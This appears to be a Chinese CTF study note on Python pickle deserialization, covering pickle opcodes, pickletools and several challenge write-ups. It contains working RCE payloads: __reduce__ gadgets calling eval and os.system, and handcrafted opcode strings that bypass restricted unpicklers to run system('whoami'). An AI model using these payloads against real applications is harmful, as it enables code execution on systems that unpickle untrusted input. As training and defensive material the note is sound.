### 文章

[pickle反序列化初探 - 先知社区](F:\LocalCTF\pickle反序列化初探 - 先知社区.html)

[Python反序列化漏洞的花式利用 - 先知社区 ](F:\LocalCTF\Python反序列化漏洞的花式利用 - 先知社区.html) //一些花式利用方法

[SecMap - 反序列化（Python）](F:\LocalCTF\SecMap - 反序列化（Python） - Tr0y's Blog.html)

[Code-Breaking中的两个Python沙箱 _ 离别歌](F:\LocalCTF\Code-Breaking中的两个Python沙箱 _ 离别歌.html)

[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎](F:\LocalCTF\从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎.html)

[BH_US_11_Slaviero_Sour_Pickles_Slides](F:\LocalCTF\BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)

[通过AST来构造Pickle opcode - 先知社区](F:\LocalCTF\通过AST来构造Pickle opcode - 先知社区.html)

[Python Pickle的任意代码执行漏洞实践和Payload构造 - 知乎](F:\LocalCTF\Python Pickle的任意代码执行漏洞实践和Payload构造 - 知乎.html)

### PVM协议

当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新。

1. v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python
2. v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容
3. v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。
4. v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。
5. v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。
6. v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）。

### opcode

```
MARK           = b'('   # 向栈中压入一个 MARK 标记
STOP           = b'.'   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值
POP            = b'0'   # 丢弃栈顶对象
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # 实例化一个 float 对象
INT            = b'I'   # 实例化一个 int 或者 bool 对象
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # 栈中压入 None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   # push persistent object; id is taken from stack
REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈
STRING         = b'S'   # 实例化一个字符串对象
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   # push string; counted binary string argument < 256 bytes
UNICODE        = b'V'   # 实例化一个 UNICODE 字符串对象
BINUNICODE     = b'X'   # push Unicode string; counted UTF-8 string argument
APPEND         = b'a'   # 将栈的第一个元素 append 到第二个元素（必须为列表）中
BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()
GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈
DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果
EMPTY_DICT     = b'}'   # 向栈中直接压入一个空字典
APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中
GET            = b'g'   # 将 memo[n] 的压入栈
BINGET         = b'h'   # push item from memo on stack; index is 1-byte arg
INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表
EMPTY_LIST     = b']'   # 向栈中直接压入一个空列表
OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，
PUT            = b'p'   # 将栈顶对象储存至 memo[n]
BINPUT         = b'q'   # store stack top in memo; index is 1-byte arg
LONG_BINPUT    = b'r'   # store stack top in memo; index is 4-byte arg
SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中
TUPLE          = b't'   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果
EMPTY_TUPLE    = b')'   # 向栈中直接压入一个空元组
SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py
```

```
# Pickle opcodes.  See pickletools.py for extensive docs.  The listing
# here is in kind-of alphabetical order of 1-character pickle code.
# pickletools groups them by purpose.

MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

# Protocol 2

PROTO          = b'\x80'  # identify pickle protocol
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
EXT1           = b'\x82'  # push object from extension registry; 1-byte index
EXT2           = b'\x83'  # ditto, but 2-byte index
EXT4           = b'\x84'  # ditto, but 4-byte index
TUPLE1         = b'\x85'  # build 1-tuple from stack top
TUPLE2         = b'\x86'  # build 2-tuple from two topmost stack items
TUPLE3         = b'\x87'  # build 3-tuple from three topmost stack items
NEWTRUE        = b'\x88'  # push True
NEWFALSE       = b'\x89'  # push False
LONG1          = b'\x8a'  # push long from < 256 bytes
LONG4          = b'\x8b'  # push really big long

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

# Protocol 3 (Python 3.x)

BINBYTES       = b'B'   # push bytes; counted binary string argument
SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " < 256 bytes

# Protocol 4

SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes
BINUNICODE8      = b'\x8d'  # push very long string
BINBYTES8        = b'\x8e'  # push very long bytes string
EMPTY_SET        = b'\x8f'  # push empty set on the stack
ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
FROZENSET        = b'\x91'  # build frozenset from topmost stack items
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
MEMOIZE          = b'\x94'  # store top of the stack in memo
FRAME            = b'\x95'  # indicate the beginning of a new frame

# Protocol 5

BYTEARRAY8       = b'\x96'  # push bytearray
NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
READONLY_BUFFER  = b'\x98'  # make top of stack readonly
```



### pickletools

 Python官方提供方便分析Pickle序列化数据的工具 `pickletools`

`pickletools.dis`可读性较强的方式展示一个序列化对象

`pickletools.optimize`对一个序列化结果进行优化

```python
import pickletools

print(pickletools.dis(serialized))
```

结果如下

``` python
    0: c    GLOBAL     'copy_reg _reconstructor'
   25: p    PUT        0
   28: (    MARK
   29: c        GLOBAL     '__main__ Test'
   44: p        PUT        1
   47: c        GLOBAL     '__builtin__ object'
   67: p        PUT        2
   70: N        NONE
   71: t        TUPLE      (MARK at 28)
   72: p    PUT        3
   75: R    REDUCE
   76: p    PUT        4
   79: (    MARK
   80: d        DICT       (MARK at 79)
   81: p    PUT        5
   84: V    UNICODE    'a'
   87: p    PUT        6
   90: I    INT        1
   93: s    SETITEM
   94: b    BUILD
   95: .    STOP
highest protocol among opcodes = 0
```

### 为类赋值

有些对象的 `__dict__` 属于 `mappingproxy` 类型

```python
class C:pass
ci=C()
print(type(C.__dict__)) #<class 'mappingproxy'>
print(type(ci.__dict__)) #<class 'dict'>
```

如果直接用`b`对其进行属性设置会报错

先看源码

```python
    def load_build(self):
        stack = self.stack
        state = stack.pop()
        inst = stack[-1]
        setstate = getattr(inst, "__setstate__", None)
        if setstate is not None:
            setstate(state)
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v  # 默认 mappingproxy 会走到这里，而 mappingproxy 类型禁止这样的操作	
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v) # 所以我们需要让 load_build 走到这里，对于setattr，mappingproxy 是允许的
```

因此如果 `state` 是两个元素的元组，那么会执行 `state, slotstate = state`，如果此时 `state in [None, {}]`（由于 `_pickle` 逻辑问题，是没办法让 state 等于 `''`、`0` 等这种值的），那么就会跑去执行 `setattr(inst, k, v)`

所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 `cA\nb\n}Va\nI1\nsb.` 应该改为 `cA\nb\n(N}Va\nI1\ntsb.` 或者 `cA\nb\n(}}Va\nI1\ntsb.`

### object.__reduce__()函数构成的利用链

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a

```
```python
#!/usr/bin/env python
# encoding: utf-8
import os
import pickle
class test(object):
    def __reduce__(self):
        return (os.system,('ls',))

a=test()
payload=pickle.dumps(a)
print payload
pickle.loads(payload)
```

### 其他模块的load

**其他模块的load也可以触发pickle反序列化漏洞。**例如：`numpy.load()`先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此`numpy.load()`也可以触发pickle反序列化漏洞。

### 一些例题

#### pyshv1

```python
# ----- securePickle.py ----- 
import pickle
import io
import sys

whitelist = []
# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        return pickle.Unpickler.find_class(self, module, name)


def loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


dumps = pickle.dumps


#  ----- server.py ----- 
import securePickle as pickle
import codecs
import sys

pickle.whitelist.append('sys')


class Pysh(object):
    def __init__(self):
        self.login()
        self.cmds = {}

    def login(self):
        user = input().encode('ascii')
        user = codecs.decode(user, 'base64')
        user = pickle.loads(user)
        raise NotImplementedError("Not Implemented QAQ")

    def run(self):
        while True:
            req = input('$ ')
            func = self.cmds.get(req, None)
            if func is None:
                print('pysh: ' + req + ': command not found')
            else:
                func()


if __name__ == '__main__':
    pysh = Pysh()
    pysh.run()
```

**solution**

```python
import pickle, pickletools
import base64

opcode=b'''csys
modules
p0
Vsys
g0
s0csys
get
(Vos
tRp1
0g0
Vsys
g1
s0csys
system
(S'\\x77\\x68\\x6f\\x61\\x6d\\x69'
tR.'''

pickletools.dis(opcode)
print(base64.b64encode(opcode))
pickle.loads(opcode)
```

####  pyshv2

```python
# ----- structs.py ----- 
# structs.py 是一个空文件


# ----- securePickle.py ----- 
import pickle
import io


whitelist = []


# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        module = __import__(module)
        return getattr(module, name)


def loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


dumps = pickle.dumps


#  ----- server.py ----- 
import securePickle as pickle
import codecs
import sys

pickle.whitelist.append('structs')


class Pysh(object):
    def __init__(self):
        self.login()
        self.cmds = {
            'help': self.cmd_help,
            'flag': self.cmd_flag,
        }

    def login(self):
        user = input().encode('ascii')
        user = codecs.decode(user, 'base64')
        user = pickle.loads(user)
        raise NotImplementedError("Not Implemented QAQ")

    def run(self):
        while True:
            req = input('$ ')
            func = self.cmds.get(req, None)
            if func is None:
                print('pysh: ' + req + ': command not found')
            else:
                func()

    def cmd_help(self):
        print('Available commands: ' + ' '.join(self.cmds.keys()))

    def cmd_su(self):
        print("Not Implemented QAQ")
        # self.user.privileged = 1

    def cmd_flag(self):
        print("Not Implemented QAQ")


if __name__ == '__main__':
    pysh = Pysh()
    pysh.run()

```

**solution**

```python
import base64
import pickletools

ser = b"""cstructs
__dict__
Vstructs
cstructs
__builtins__
s0cstructs
__builtins__
V__import__
cstructs
__getattribute__
s0cstructs
get
(Veval
tR(S"[i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == '_wrap_close'][0].__init__.__globals__['system']('whoami')"
tR.
"""

pickletools.dis(ser)
print(base64.b64encode(ser))
```

#### pyshv3

```python
# ----- securePickle.py ----- 
import pickle
import io


whitelist = []


# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        return pickle.Unpickler.find_class(self, module, name)


def loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


dumps = pickle.dumps



#  ----- server.py ----- 
import securePickle as pickle
import codecs
import os


pickle.whitelist.append('structs')


class Pysh(object):
    def __init__(self):
        self.key = os.urandom(100)
        self.login()
        self.cmds = {
            'help': self.cmd_help,
            'whoami': self.cmd_whoami,
            'su': self.cmd_su,
            'flag': self.cmd_flag,
        }

    def login(self):
        with open('../flag.txt', 'rb') as f:
            flag = f.read()
        flag = bytes(a ^ b for a, b in zip(self.key, flag))
        user = input().encode('ascii')
        user = codecs.decode(user, 'base64')
        user = pickle.loads(user)
        print('Login as ' + user.name + ' - ' + user.group)
        user.privileged = False
        user.flag = flag
        self.user = user

    def run(self):
        while True:
            req = input('$ ')
            func = self.cmds.get(req, None)
            if func is None:
                print('pysh: ' + req + ': command not found')
            else:
                func()

    def cmd_help(self):
        print('Available commands: ' + ' '.join(self.cmds.keys()))

    def cmd_whoami(self):
        print(self.user.name, self.user.group)

    def cmd_su(self):
        print("Not Implemented QAQ")
        # self.user.privileged = 1

    def cmd_flag(self):
        if not self.user.privileged:
            print('flag: Permission denied')
        else:
            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))


if __name__ == '__main__':
    pysh = Pysh()
    pysh.run()



#  ----- structs.py ----- 
class User(object):
    def __init__(self, name, group):
        self.name = name
        self.group = group
        self.isadmin = 0
        self.prompt = ''
```

**solution**

```python
import pickle, pickletools
import base64

opcode=b'''cstructs
User
p0
0g0
(N}V__set__
g0
stb0g0
(N}Vprivileged
g0
(VKi1ro
Vroot
tRstb0g0
(VKi1ro
Vroot
tR.'''

pickletools.dis(opcode)
print(base64.b64encode(opcode))
obj = pickle.loads(opcode)


# from structs import User
# User.__set__ = User
# User.privileged = User("tr0y", "root")
# user = User("tr0y", "root")
# user.privileged = False
# print(user.privileged)
```

#### [XCTF 高校战“疫”网络安全分享赛]WEB_WP

```python
class Animal:
    def __init__(self, name, category):
        self.name = name
        self.category = category

    def __repr__(self):
        return f'Animal(name={self.name}, category={self.category})'

    def __eq__(self, other):
        return type(other) is Animal and self.name == other.name and self.category == other.category
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        print(name)
        if module == '__main__':
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()

def read(filename, encoding='utf-8'):
    with open(filename, 'r', encoding=encoding) as fin:
        return fin.read()


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.args.get('source'):
        return Response(read(__file__), mimetype='text/plain')

    if request.method == 'POST':
        try:
            pickle_data = request.form.get('data')
            if b'R' in base64.b64decode(pickle_data):
                return 'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'
            else:
                result = restricted_loads(base64.b64decode(pickle_data))
                if type(result) is not Animal:
                    return 'Are you sure that is an animal???'
            correct = (result == Animal(secret.name, secret.category))
            return "result={}\npickle_data={}\ngiveflag={}\n".format(result, pickle_data, correct)
        except Exception as e:
            print(repr(e))
            return "Something wrong"

```

**solution**

进行变量覆盖

```python
data = b"""c__main__
secret
(Vname
VKi1ro
db(Vcategory
VKi1ro
db0(c__main__
Animal
VKi1ro
VKi1ro
o."""   

data = base64.b64encode(data)
```

#### [蓝帽杯2022]file_session

[【官方WP】第六届“蓝帽杯”初赛CTF题目解析](F:\LocalCTF\【官方WP】第六届“蓝帽杯”初赛CTF题目解析.html)

#### [2018-XCTF-HITB-WEB] Python's-Revenge

[[2018-XCTF-HITB-WEB] Python's-Revenge](F:\LocalCTF\HITB Python_revenge writeup && python 沙箱逃逸详解 _ m3lon.html)

